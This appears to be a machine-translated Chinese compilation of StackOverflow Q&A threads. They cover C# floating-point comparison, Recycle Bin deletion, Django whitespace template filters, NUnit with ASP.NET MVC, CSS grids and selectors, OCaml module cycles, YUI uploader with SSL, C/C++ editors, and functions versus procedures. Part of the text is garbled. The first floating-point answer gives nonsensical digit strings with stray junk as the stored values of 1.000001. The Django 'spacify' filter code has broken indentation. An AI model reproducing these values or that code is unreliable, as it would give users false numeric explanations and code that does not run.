# StackOverflow 问答 000721000-000721999

# c# - 为什么这个问题的结果不同？

> ID：721002
> 
> 赞同：1
> 
> 时间：2009-04-06T11:11:44.710
> 
> 标签：c#, floating-point, floating-accuracy

我遇到了以下算术问题。

但是结果和正常的数学运算不同，为什么会这样呢？

```
double d1 = 1.000001;

double d2 = 0.000001;

Console.WriteLine((d1-d2)==1.0); 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2009-04-06T11:15:39.787

我想你在 Jon Skeet 的 Brainteasers 页面上找到了这个问题？[答案在](http://www.yoda.arachsys.com/csharp/teasers-answers.html)同一网站上列出和解释。

作为参考，这是从该页面复制的答案。

* * *

**3）愚蠢的算术**

计算机应该擅长算术，不是吗？为什么这会打印“False”？

```
double d1 = 1.000001; double d2 =
0.000001; Console.WriteLine((d1-d2)==1.0); 
```

答：这里的所有值都存储为二进制浮点数。采用虽然1.00001实际上存储在1.00001实际上存储为1.00000099999999322998046695600470493236333362046936/30801,00017333362046956/303033339303936/3099999999981deraiver] hys，而1.000001实际上是1.000001的实际存储为1.00000099999999322998046932999804695633362046956004798936633398049366/3080807366455078 它们之间的差值不完全是 1.0，实际上也不能准确地存储差值。

* * *

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-04-06T11:19:13.727

[从Double.Equals](https://stackoverflow.com/questions/485175/c-net-is-it-safe-to-check-floating-point-values-for-equality-to-0/485741)的 MSDN 条目中：

> **比较精度**
> 
> 应谨慎使用 Equals 方法，因为由于两个值的精度不同，两个明显等效的值可能不相等。下面的示例报告 Double 值 .3333 和通过将 1 除以 3 返回的 Double 不相等。
> 
> ...
> 
> 一种推荐的技术不是比较相等性，而是定义两个值之间的可接受差异范围（例如其中一个值的 0.01%）。如果两个值之间的差值的绝对值小于或等于该余量，则差异可能是由于精度差异造成的，因此这些值很可能相等。下面的示例使用此技术比较 .33333 和 1/3，这是前面的代码示例发现不相等的两个 Double 值。

如果您需要进行大量“相等”比较，最好在 .NET 3.5 中编写一些辅助函数或扩展方法进行比较：

```
public static bool AlmostEquals(this double double1, double double2, double precision)
{
    return (Math.Abs(double1 - double2) <= precision);
} 
```

这可以通过以下方式使用：

```
double d1 = 1.000001;

double d2 = 0.000001;

bool equals = (d1 - d2).AlmostEquals(1.0, 0.0000001); 
```

请参阅这个非常相似的问题：[C#.NET: Is it safe to check floating point values for equal to 0?](https://stackoverflow.com/questions/485175/c-net-is-it-safe-to-check-floating-point-values-for-equality-to-0/485741)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-04-06T11:15:10.723

这是因为计算机以 2 为底进行数学运算，因此许多十进制浮点数不能用有限的位数精确表示。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-04-06T11:16:42.967

因为您使用的是浮点数。

[http://docs.sun.com/source/806-3568/ncg_goldberg.html](http://docs.sun.com/source/806-3568/ncg_goldberg.html)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-04-06T11:25:37.907

如果您在应用程序中执行此类算术，[`decimal`](http://msdn.microsoft.com/en-us/library/364x0z75(VS.80).aspx)则应使用该类型

```
decimal d1 = 1.000001M;

decimal d2 = 0.000001M;

Console.WriteLine((d1 - d2) == 1.0M); // evaluates as true 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-04-06T11:15:35.997

这可能是由于浮点精度问题，因为您的结果可能不完全是 1.0，但可能类似于 1.000000000001

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-04-06T11:15:57.070

发生这种情况是因为浮点类型使用以 2 为基数而不是以 10 为基数的表示存储数字。这导致 double 无法准确存储像 0.1 这样的值。例如 0.1 由单个值 0.100000001490116119384765625 表示。

您必须使用 Decimal 来消除错误。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-04-06T11:18:15.100

这是由于浮点数在 CPU 中的工作方式，它不是 C# 特定的。有关更多信息，请参阅[此](http://en.wikipedia.org/wiki/Floating_point)Wikipedia 条目和[此处](http://docs.sun.com/source/806-3568/ncg_goldberg.html)的论文。

简短的回答是浮点数没有存储为精确的表示，因此使用“==”进行比较不会以您尝试使用它的方式工作。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-04-06T11:17:02.327

看看 python 文档必须说这两个问题是一样的：

[http://docs.python.org/tutorial/floatingpoint.html](http://docs.python.org/tutorial/floatingpoint.html)

# c# - 如何将文件移动到回收站

> ID：721026
> 
> 赞同：14
> 
> 时间：2009-04-06T11:18:57.360
> 
> 标签：c#, recycle-bin

我需要在 .net 2003 中将文件移动到回收站

我从refrence添加了microsft.visualbasic.runtime dll，但我无法获取filesystem.deletedirectory，那么该怎么办..有人可以帮助我吗？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2009-04-06T11:27:04.097

我发现了这个，不知道它是否有效，但值得一试。

```
using Microsoft.VisualBasic;

string path = @"c:\myfile.txt";
FileIO.FileSystem.DeleteDirectory(path, FileIO.UIOption.OnlyErrorDialogs, RecycleOption.SendToRecycleBin); 
```

编辑：Nifle 的明智之言：只记得添加对 Microsoft.VisualBasic.dll 的引用

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-17T09:57:18.677

基本上，在顶部的引用和实际调用方法之间，您需要全名（当然是在添加库之后）

您可以完全调用它：

```
Microsoft.VisualBasic.FileIO.FileSystem.DeleteDirectory(
    path,
    FileIO.UIOption.OnlyErrorDialogs,
    RecycleOption.SendToRecycleBin); 
```

* * *

或者，您可以将引用与其他引用一起添加到顶部：

```
using Microsoft.VisualBasic.FileIO 
```

接着

```
FilesSystem.DeleteDirectory( etc ); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T11:21:41.410

[这](http://www.daveamenta.com/2008-05/c-delete-a-file-to-the-recycle-bin/)可能会帮助你。看起来您需要添加对 Microsoft.VisualBasic.dll 的引用或使用 P/Invoke。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-06T11:51:32.587

你有没有

```
using Microsoft.VisualBasic.FileIO; 
```

在您的页面顶部？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-18T22:59:45.743

使用

```
FileIO.FileSystem.DeleteDirectory(path, FileIO.UIOption.OnlyErrorDialogs, RecycleOption.SendToRecycleBin); 
```

需要：`00:00:00.4036573`删除一个文件。使用

```
[DllImport("shell32.dll", CharSet = CharSet.Auto)]
private static extern int SHFileOperation(ref SHFILEOPSTRUCT FileOp); 
```

只需要：`00:00:00.1107684`删除一个文件。

在那里可以找到一个实现： [将文件发送到回收站](https://stackoverflow.com/questions/3282418/visual-c-sharp-send-a-file-to-the-recycle-bin)

# c# - 导航图像在 jQuery 灯箱中未正确显示

> ID：721031
> 
> 赞同：0
> 
> 时间：2009-04-06T11:21:11.380
> 
> 标签：c#, asp.net, jquery, vb.net, image

从底部的[这个 aspcode.net 页面（在附件下），您可以下载该项目。](http://www.aspcode.net/A-simple-image-gallery.aspx)
由于某种原因，当我运行它时，关闭按钮和下一个和上一个按钮不起作用。好吧，我的意思是它确实有效，但它没有显示实际图像。任何人都可以弄清楚吗？这应该很容易，但我无法让它工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T11:44:30.420

代码中 URL 的路径以 / 开头——这意味着 jQuery 需要位于站点的根目录中。如果此应用程序作为虚拟目录运行，请从它引用图像的任何位置删除前导斜杠。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-06T11:25:57.033

您是否将图像保存到正确的路径？

尝试使用图像的绝对链接，例如`http://localhost/myimage.jpg`，这样您就可以测试图像是否真的在您所说的位置。

# python - Django模板剥离空格？

> ID：721035
> 
> 赞同：16
> 
> 时间：2009-04-06T11:22:15.027
> 
> 标签：python, django, django-templates

我在使用 Django 模板和 CharField 模型时遇到问题。

所以我有一个带有 CharField 的模型，它创建了一个用下划线替换空格的 slug。如果我创建一个对象 Somename Somesurname，这将创建 slug *Somename_Somesurname*并在模板上按预期显示。

但是，如果我创建一个对象*Somename Somesurname*（注意第二个空格），则会创建 slug *Somename__Somesurname*，尽管在 Django 控制台上我将其视为`<Object: Somename Somesurname>`，但在模板上它显示为*Somename Somesurname*。

那么 Django 模板会以某种方式去除空格吗？是否有一个过滤器可以用来获取带有空格的名称？

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2009-04-06T16:46:38.150

让我先说@DNS关于为什么没有显示空格的答案是正确的。

考虑到这一点，此模板过滤器将替换字符串中的任何空格`&nbsp;`

用法：

```
{{ "hey there  world"|spacify }} 
```

输出将是`hey&nbsp;there&nbsp;&nbsp;world`

这是代码：

```
from django.template import Library
from django.template.defaultfilters import stringfilter
from django.utils.html import conditional_escape
from django.utils.safestring import mark_safe
import re

register = Library()

@stringfilter
def spacify(value, autoescape=None):
    if autoescape:
    esc = conditional_escape
    else:
    esc = lambda x: x
    return mark_safe(re.sub('\s', '&'+'nbsp;', esc(value)))
spacify.needs_autoescape = True
register.filter(spacify) 
```

有关模板过滤器如何工作以及如何安装它们[的说明，请查看文档](http://docs.djangoproject.com/en/dev/howto/custom-template-tags/#code-layout)。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2009-04-06T11:45:05.380

Django 在内部将对象视为有两个空格（根据`repr`输出中的两个下划线和两个空格判断）。它在模板中只显示一个空格这一事实正是 HTML 的工作原理。请注意，在您刚刚提出的问题中，您输入两个空格的大多数地方，只出现了一个？

从[HTML4 规范](http://www.w3.org/TR/html401/struct/text.html)：

> 特别是，用户代理在产生输出字间距时应该折叠输入的空白​​序列。

正如 S.Lott 建议的那样，您可以通过添加调试日志或使用 Firefox 的 Firebug 插件或类似的东西来验证我的猜测是否正确，以查看发送到浏览器的确切内容。然后你就会确定问题出在哪一端。

如果多个空格对您来说真的很重要，您将需要使用`&nbsp;`实体，尽管我不知道如何让 Django 使用它们来编码该特定对象的输出。

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2012-04-21T12:16:28.770

有一个内置的模板标签**spaceless**

```
{% spaceless %}
    <p>
        <a href="foo/">Foo</a>
    </p>
{% endspaceless %} 
```

结果：

```
<p><a href="foo/">Foo</a></p> 
```

[在 django文档](https://docs.djangoproject.com/en/dev/ref/templates/builtins/?from=olddocs#spaceless)中阅读更多内容。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2019-09-03T08:45:11.230

对于 django 模板有问题的人，试试这个：我的`<optgorup>`标签也有类似的问题，我从 django 模型中获取我的值以显示在选择下。我简单地使用`''`了标签选项来获取带有空格的完整文本。`<optgroup label='{{key}}'>`

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2020-03-19T13:58:20.630

如果您正在寻找一种方法来删除 html 中的空格，那么这可能就是您正在寻找的：

```
html_tag|cut:" " 
```

cut 是用于在您的 html 中过滤的内置标记。假设您想为每个 html 标记使用一个 id 以用作永久链接以在动态生成它时引用，那么例如您的解决方案将是：

```
<div id="{{category_name|cut:' ' }}"> 
```

[Django 文档](https://docs.djangoproject.com/en/3.0/ref/templates/builtins/#cut)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-04-06T12:41:11.407

[Slugify](http://docs.djangobrasil.org/ref/templates/builtins.html#slugify)删除所有前导空格，您需要将其重写为自定义模板标签以获得您所追求的行为。原始过滤器代码如下所示

```
def slugify(value):
   """
   Normalizes string, converts to lowercase, removes non-alpha characters,
   and converts spaces to hyphens.
   """
   import unicodedata
   value = unicodedata.normalize('NFKD', value).encode('ascii', 'ignore')
   value = unicode(re.sub('[^\w\s-]', '', value).strip().lower())
   return mark_safe(re.sub('[-\s]+', '-', value)) 
```

它将“some string”更改为“some-string”，从而消除了额外的空格。你可以像这样改变它：

```
def new_slugify(value):
   """
   Normalizes string, converts to lowercase, removes non-alpha characters,
   and converts spaces to hyphens, does not remove leading whitespace.
   """
   import unicodedata
   value = unicodedata.normalize('NFKD', value).encode('ascii', 'ignore')
   value = unicode(re.sub('[^\w\s-]', '', value).strip().lower())
   return mark_safe(re.sub('[-\s]', '-', value)) 
```

这将导致以下行为：“Some String here”到“some--string-here”

您可能仍然会遇到前面提到的 html 如何处理额外空格的问题，您必须编写另一个 deslugify 过滤器。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-11-30T09:21:57.037

此标签保留空格和换行符。我复制了Django自己的标签linebreaksbr，然后添加了一行用nbsp替换空格。它不会替换单个空格，因此文本源仍然可读。我写这个是因为我无法让 spacify 标记（其他答案）与 linebreaksbr 一起使用。

```
from django.template.defaultfilters import stringfilter
from django.utils.safestring import mark_safe, SafeData
from django.utils.text import normalize_newlines
from django.utils.html import escape

@register.filter(is_safe=True, needs_autoescape=True)
@stringfilter
def keep_spacing(value, autoescape=None):
    autoescape = autoescape and not isinstance(value, SafeData)
    value = normalize_newlines(value)
    if autoescape:
        value = escape(value)
    value = mark_safe(value.replace('  ', ' &nbsp;'))             
    return mark_safe(value.replace('\n', '<br />')) 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-09-08T21:04:24.393

`'\s'`在上述用例中可能没问题，但要小心，这会替换其他空格，如`'\t'`or `'\n'`！如果这不是您想要的，请`" "`改用。

# asp.net - 使用 ASP.Net MVC 1.0 安装 nUnit

> ID：721038
> 
> 赞同：5
> 
> 时间：2009-04-06T11:23:23.917
> 
> 标签：asp.net, asp.net-mvc, visual-studio-2008, unit-testing, nunit

有人对如何使用 ASP.Net MVC 安装 nUnit 有任何建议/信息吗？我已经看过与预览版本相关的以前的帖子，并且涉及到必须创建模板文件、运行命令提示符甚至弄乱注册表的可怕噩梦。

显然，这远非理想，鉴于微软打算允许任何测试框架，我希望这是一个在完整版本中得到很大改进的过程。谷歌搜索似乎返回 MVC 处于预览阶段时的结果！这适用于 Visual Studio 2008 Pro。

干杯:)

**编辑：似乎可能不是：http:** [//msdn.microsoft.com/en-us/library/dd381614.aspx](http://msdn.microsoft.com/en-us/library/dd381614.aspx)

**编辑2：：**好的发现这个： http: [//blogs.msdn.com/webdevtools/archive/2008/05/30/asp-net-mvc-preview-3-tooling-updates.aspx](http://blogs.msdn.com/webdevtools/archive/2008/05/30/asp-net-mvc-preview-3-tooling-updates.aspx) - 他们提供了一些模板和之后安装批处理文件，添加新的 MVC 应用程序时它会出现在下拉列表中。然而，它是为 MVC 的预览版而设计的，因此并不理想。再次，任何有更好建议的人请发布:)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-04-13T20:20:25.507

[在此处下载](http://memphiswebtech.com/public/nunitprojecttemplate.zip "下载")并按照自述文件中的步骤进行安装。

这是我如何做到这一点的概述。

1.  解压visual studio自带的MVC测试项目模板，MvcWebApplicationTestProjectTemplatev1.cs.zip。
2.  将 HomeController.cs 和 AccountController.cs 文件改成 NUnit 语法，如 [TestClass] 改成 [TestFixture] 等......
3.  将 MvcApplicationTest.csproj 中的引用更新为 NUnit.Framework。
4.  调整 MvcWebApplicationTestProjectTemplate.cs.vstemplate 文件更改 NamePackage、描述、图标包和默认名称。

将其压缩后，您将需要打开 Visual Studio 命令提示符并键入 devenv /setup 以将模板注册到 Visual Studio。

您将需要创建一个注册表项，以便 Visual Studio 知道新模板所在的位置。

如果我得到一个博客，我会很乐意用详细的帖子更新我的答案。把它放在这里有点牵强... Goolish 不是这个词:)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-12T13:57:20.190

ScottGu 刚刚[为 ASP.NET MVC 1.0 发布了一些更新的 NUnit 模板](http://blogs.msdn.com/webdevtools/archive/2009/04/28/updated-nunit-templates-for-asp-net-mvc-1-0-rtm.aspx)。您需要做的就是运行随附的**installNUnit.cmd**文件。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-11-17T12:53:00.600

我已经在此发布了一个指南和对 Joe Cartano 帖子的更新，以便它可以与 MVC 2.0 一起使用。

[http://www.dalsoft.co.uk/blog/index.php/2009/11/17/nunit-templates-for-asp-net-mvc-2-0-preview-2/](http://www.dalsoft.co.uk/blog/index.php/2009/11/17/nunit-templates-for-asp-net-mvc-2-0-preview-2/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-06T18:20:08.613

您是否尝试过创建自己的测试项目（参考 MVC Web 应用项目）并手动添加您需要的参考？我这样做是因为试图让 VS.Net 尝试为我创建测试项目从来没有那么好（再说一次，我在预览 3 之前就这样做了）。这是一个小 PITA，因为我必须将 using 语句添加到我在测试项目中创建的每个类中，但它可以工作。没有命令提示符，没有注册表，不需要这些废话。

顺便说一句，[MvcContrib](http://mvccontrib.codeplex.com/)的测试助手是天赐之物。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-04-19T22:54:37.597

我安装了 Xunit 还没有足够远来使用它但它安装得很好我每次都必须参考 System.Routid 和 system.Web.Abstrations

# css - 我应该学习哪个 CSS 网格系统？

> ID：721041
> 
> 赞同：3
> 
> 时间：2009-04-06T11:23:57.957
> 
> 标签：css, css-frameworks, grid-system

### 复制

> [什么是最好的 CSS 框架，值得付出努力吗？](https://stackoverflow.com/questions/203069)
> [有人可以推荐一个 Bells and Whistles CSS 框架吗？](https://stackoverflow.com/questions/322484)
> [帮我选一个 CSS 框架：960 vs Blueprint vs ???](https://stackoverflow.com/questions/589184)
> [最好的 CSS 框架？](https://stackoverflow.com/questions/639285)
> [如何选择 CSS 框架？](https://stackoverflow.com/questions/647853)
> [什么是最好的 CSS GridFramework](https://stackoverflow.com/questions/76996)

我开始使用[Blueprint CSS](http://blueprintcss.org/)，但听说过很多关于[960 Grid System](http://960.gs/)和[Yahoo!的事情。网格](http://developer.yahoo.com/yui/grids/)。

我似乎无法很好地处理使用哪个（或为什么）。

我正在寻找有关我应该使用哪种网格系统的任何建议。易用性、灵活性和代码可读性对我来说很重要。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-04-06T11:42:53.060

我在几个站点上使用过 YUI Grids，发现它与 Fonts 和 Reset 组件相结合，可以提供非常高质量的跨浏览器兼容站点。它的设计满足了 960.gs 的不同目标，快速查看您网站的故事板将表明哪个更合适。

YUI Grids 可以嵌套实现元素的细分，通常我觉得它很容易使用。

I'd say that use of a reset css is *crucial*, and work with whatever grid system you find most comfortable.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-06T11:33:14.923

[不久前我问了一个类似的问题。](https://stackoverflow.com/questions/203069/what-is-the-best-css-framework-and-are-they-worth-the-effort)

就我从那以后的经验而言，我已经放弃了整个 css 框架/网格系统。我确实愤怒地尝试了雅虎网格，它太不灵活了。我觉得 BluePrint 要好得多。

但正如我的问题的答案所指出的那样，css 框架和网格忽略了 CSS 正在解决的问题。

# css - 有没有办法在 CSS 中查询具有多个类的元素？

> ID：721049
> 
> 赞同：3
> 
> 时间：2009-04-06T11:26:37.497
> 
> 标签：css, css-selectors

如何查询同时具有两个类的元素？

例如：

```
<div><span class="major minor">Test</span></div> 
```

我想同时为所有具有“主要”和“次要”类的跨度设置样式。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-04-06T11:29:14.200

以下应该可以解决问题：

```
span.major.minor { color: red; } 
```

请注意，对于 Internet Explorer 6，您必须小心 - 它只会读取选择器的最后一个类。例如，它将错误地将上述规则应用于以下内容：

```
<span class="minor">Test</span> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-04-06T11:37:39.267

使用类限定符两次，例如：

```
.major.minor { ... } 
```

**但是**。它在 IE6 中不起作用（或者在[Quirks Mode](http://en.wikipedia.org/wiki/Quirks_mode)中的 IE7 中）。当你在同一个元素上指定多个类选择器时，IE 只关注最后一个。所以上面的选择器会匹配任何带有`class="minor"`.

解决方法包括将多个类复制为一个类：

```
.major-minor { ... }
<span class="major minor major-minor">...</span> 
```

或者，如果有备用元件使其清洁，则收容：

```
.major .minor { ... }
<span class="major"><span class="minor">...</span></span> 
```

# compiler-construction - OCAML 中的循环依赖控制

> ID：721062
> 
> 赞同：1
> 
> 时间：2009-04-06T11:32:16.720
> 
> 标签：compiler-construction, dependency-injection, module, ocaml, circular-dependency

**[编辑]**

谢谢你的回答，我的问题如下：

**模块 A 称为 Map.ml**

```
let lst = ref [Instance1_ModuleB; Instance2_ModuleB; ...];;
let is_coliding p = DoSomeWork_And_Return_A_Bool ;;
.... other things here. 
```

**模块 B 称为 Player.ml**

```
Open Map
class player_object (x_in, y_in, name_in)=

object (self)

method jump () =
       if Map.is_colliding self then
             DoSomeThing ();;
.... 
```

任何线索如何使它起作用。

**顺便说一句，其他编程语言如何处理这个问题？我从不在乎 C# 中的这种依赖！！！！** 谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-04-06T12:09:30.267

如果你的模块A只需要模块B的类型，没有值，那么你可以用模块B的接口创建一个moduleB.mli，并在moduleA之前编译它：

模块A.ml：

```
let foo (bar : ModuleB.bar) = bar.baaz 
```

模块B.mli：

```
class bar : object
  method baaz : int
  method buz : int
end 
```

模块B.ml

```
class bar =
object(s)
  method baaz = 3
  method buz = ModuleA.foo s
end 
```

但是，如果您对值或函数有循环依赖，则没有简单的解决方案，例如：

模块A.ml：

```
let li = [new bar; new bar]

let foo (bar : ModuleB.bar) = bar.baaz 
```

可以尝试通过使用引用或可变值来打破这种循环依赖：

模块A.ml：

```
let li = [new bar; new bar]

let foo (bar : ModuleB.bar) = bar.baaz
let _ = ModuleB.initB foo 
```

模块B.ml

```
let foo = ref (fun x -> (failwith "not initialized" : int))

class bar =
object(s)
  method baaz = 3
  method buz = !foo s
end

let initB f = foo := f 
```

# firefox - YUI 上传器 + SSL + 火狐

> ID：721085
> 
> 赞同：2
> 
> 时间：2009-04-06T11:45:56.203
> 
> 标签：firefox, ssl, ssl-certificate, yui-uploader

如果您的服务器启用了 SSL，并且您正在使用 YUI 上传器，是否可以使用 Firefox 浏览器上传？

我们目前在使用 Firefox 时遇到问题，但使用 IE (7) 上传似乎没问题。

任何想法为什么它在 Firefox 中失败（注意：证书已被接受）？

谢谢，弗兰兹

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-06-27T13:03:57.953

您应该能够使用 Firefox 通过 HTTPS 上传，尽管我在使用自签名证书时也遇到了一些问题。所以您可能想检查您使用的是哪种证书？

您应该注意 YUI 上传器使用的是 Flash，并且插件对于 IE (ActiveX) 和其他浏览器是不同的，这说明了不同的行为。

IE Flash 播放器检查 Windows 证书存储中证书的有效性，因此您可以使您的自签名证书看起来像一个有效的证书。

Firefox 使用自己的证书存储，我不确定 Flash 是如何管理的（如果我是正确的，FF、Safari 和 Opera 的 Flash Player 是相同的）我试图在 FF 中导入自签名证书但仍然无法正常工作我...

所以，我通过 SSL 上传在 Staging 和 Prod 上正确运行，但在 Dev 上没有...

我希望这些信息对其他人有帮助......如果我找到让它在任何地方都能工作的东西，我会发布我的解决方案。

朱利安

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-12-07T22:13:37.503

根据[YUI Uploader 备忘单](http://yuiblog.com/assets/pdf/cheatsheets/uploader.pdf)：

> 上传到 HTTPS 服务器时，请注意 Flash 不支持自签名证书。

# c++ - 使用哪个编辑器？用于编码 c/c++

> ID：721089
> 
> 赞同：0
> 
> 时间：2009-04-06T11:47:48.167
> 
> 标签：c++, c, editor

从过去 9 年开始，我一直使用 vi 作为我的编辑器，并且发现了一些我没有见过简单且非愚蠢的解决方案的东西，你们中的任何人都可以有更好的解决方案吗？

1.  每当我打开一个新文件进行编码时..默认情况下获取标题描述..带有日期，时间和作者姓名等...基本的东西。
2.  每当我打开一个文件进行编辑（更新模式）时，我希望看到默认情况下引入了一个新行，这将帮助我输入更改描述。
3.  每当我介绍一个函数/方法时，我都会得到对函数的基本描述，我必须只介绍描述，而不是指定参数和返回类型是什么……等等。

如果我只能为 vi 获得上述解决方案，那就太好了。否则，也请评论我如何使用 emacs 或类似的编辑器完成它。

-谢谢哈里什

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-04-06T12:09:10.360

请参阅有关此主题的许多以前的 StackOverflow 问题：

1.  [linux Code::Blocks、EMACS 或 GVIM 上的 C++ 开发](https://stackoverflow.com/questions/672770/c-development-on-linux-codeblocks-emacs-or-gvim)
2.  [适用于 Linux 的 C++ IDE？](https://stackoverflow.com/questions/24109/c-ide-for-linux)
3.  [适用于 Windows 的最佳 C++ IDE 或编辑器](https://stackoverflow.com/questions/89275/best-c-ide-or-editor-for-windows)
4.  [https://stackoverflow.com/questions/89924/c-editor-compiler-debugger-on-windows-lighter-than-visual-studio](https://stackoverflow.com/questions/89924/c-editor-compiler-debugger-on-windows-lighter-than-visual-studio)
5.  [https://stackoverflow.com/questions/93326/which-ide-is-best-for-c](https://stackoverflow.com/questions/93326/which-ide-is-best-for-c)

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2009-04-06T12:03:52.777

使用 csupport 插件...对 c++ 非常有用。它适用于 Vim，可能不适用于原始 Vi

[http://www.vim.org/scripts/script.php?script_id=213](http://www.vim.org/scripts/script.php?script_id=213)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-04-06T11:57:53.930

[Cream](http://cream.sourceforge.net/featurelist.html) :: Vim 文本编辑器的现代配置

> Cream 将 Vim 塑造成一个您可能已经知道的界面（有时称为 Common User Access [ext.link]）。无论您是编写电子邮件还是开发大型软件应用程序，Cream 都能为您节省时间并帮助您快速启动和运行。

从基本功能列表中：

> *   插入当前日期/时间（F11 打开可能格式的菜单，F11 x2 插入最后使用的格式）。
> 
> 程序员功能
> 
> *   上下文相关补全（Vim 的 Omni 补全功能）（Ctrl+Enterh、Ctrl+Shift+Enter）。
>     *   阻止评论和取消评论选择（F6 和 Shift+F6）。
>     *   Ctags 导航。（需要安装免费的 Exuberant ctags [ext.link] 或其他类似的标签导航程序。）通过 Alt+箭头键，在之前访问过的标签之间来回移动（Alt+Left/Right），移动到函数或变量的定义（ Alt+Down），或关闭引用的文件并返回（Alt+Up）。
>     *   当前文件可用的函数和变量列表 (Ctrl+Alt+Down)。（需要 Ctags）
>     *   基于文件类型（Esc+Space）的模板完成。（有关可用模板的列表，请参阅工具菜单。）
>     *   折线通过按键（F9 和组合）直观地隐藏整个部分。
>     *   弹出原型和信息菜单（Alt+( )。查看光标下的函数原型，无需打开带有定义的文件。
>     *   为当前选择插入行号，以任何值开头。
>     *   软制表位设置允许按制表位宽度显示现有文本，而新编辑使用此替代设置，插入制表符和空格来完成新的缩进。
>     *   差异模式查看两个文件之间的差异。
>     *   终端模式菜单（控制台菜单）（F12，仅限控制台）。
>     *   Cream、Cream Lite、Vim 或 Vi 编辑行为设置。
>     *   专家模式，使用 Esc 键在 Vim 的正常模式和插入模式之间来回切换的选项。
>     *   一次安装即可实现多用户配置。（常问问题）

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-04-06T13:14:08.973

I've used CDT for Eclipse lately, not bad.

[http://www.eclipse.org/cdt/](http://www.eclipse.org/cdt/)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-04-06T12:08:21.640

我不断调整我的 .vimrc 文件并为此类事情添加新功能。

现在我能想到这些：

1)[模板](http://www.vim.org/scripts/script.php?script_id=1172)

2）使用缩写，所以当你引入一个函数时，它会将它扩展为带有描述的文本。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-04-06T12:51:29.540

0- 可能你应该首先考虑从 vi 迁移到 vim。

1-有[很多模板扩展插件](http://vim.wikia.com/wiki/Category:Automated_Text_Insertion)。我正在维护[muTemplate](http://code.google.com/p/lh-vim/wiki/muTemplate)。muTemplate 的 C++ 模板文件在[lh-cpp](http://code.google.com/p/lh-vim/wiki/lhCpp)中可用。

2-您将不得不使用自动命令。侦听 BufRead，然后如果缓冲区是可修改的，则搜索需要插入更改日志行的位置。但是，我认为这不是最好的方法。SVN/GIT/... 是更好的解决方案。

3-我不明白你在找什么。编辑器如何知道函数在做什么？顺便说一句，lh-cpp 提供了一个 :DOX 命令，其中插入了参数列表、@return 标记（如果适用）、@throw 标记等并准备好填充。如果您不想要所有这些 doxygen 标签，而只想要一个标题标题（是英文吗？）任何模板扩展插件都可以（参见 1-）。

# function - “功能”和“程序”有什么区别？

> ID：721090
> 
> 赞同：238
> 
> 时间：2009-04-06T11:48:10.253
> 
> 标签：function, terminology, procedure

一般来说，我们都听说过编程语言中的*函数*或*过程*。但是，我刚刚发现我几乎可以互换使用这些术语（这可能是非常错误的）。

所以，我的问题是：

> 它们的功能、用途和用途有什么区别？

一个例子将不胜感激。

* * *

## 回答 #1

> 赞同：339
> 
> 时间：2009-04-06T11:52:03.427

一个函数返回一个值，一个过程只执行命令。

名称函数来自数学。它用于根据输入计算值。

过程是一组可以按顺序执行的命令。

在大多数编程语言中，甚至函数也可以有一组命令。因此，区别只是返回一个值。

但是如果你想保持函数干净，（看看函数式语言），你需要确保函数没有副作用。

* * *

## 回答 #2

> 赞同：48
> 
> 时间：2009-04-06T12:00:10.757

这取决于上下文。

在类 Pascal 语言中，函数和过程是不同的实体，不同之处在于它们是否返回值。他们的行为不同。语言语法（例如，过程调用形成语句；您不能在表达式中使用过程调用，而函数调用不形成语句，您必须在其他语句中使用它们）。因此，Pascal 培养的程序员将它们区分开来。

在类 C 语言和许多其他当代语言中，这种区别已经消失了。在静态类型语言中，过程只是具有有趣返回类型的函数。这可能就是为什么它们可以互换使用的原因。

在函数式语言中，通常没有过程之类的东西——一切都是函数。

* * *

## 回答 #3

> 赞同：23
> 
> 时间：2009-04-06T11:57:01.467

C中的示例：

```
// function
int square( int n ) {
   return n * n;
}

// procedure
void display( int n ) {
   printf( "The value is %d", n );
} 
```

尽管您应该注意 C 标准不讨论过程，只讨论函数。

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2009-04-06T11:51:43.570

一般来说，一个过程是一个指令序列。
一个函数可以相同，但它通常返回一个结果。

* * *

## 回答 #5

> 赞同：11
> 
> 时间：2009-04-06T11:53:03.707

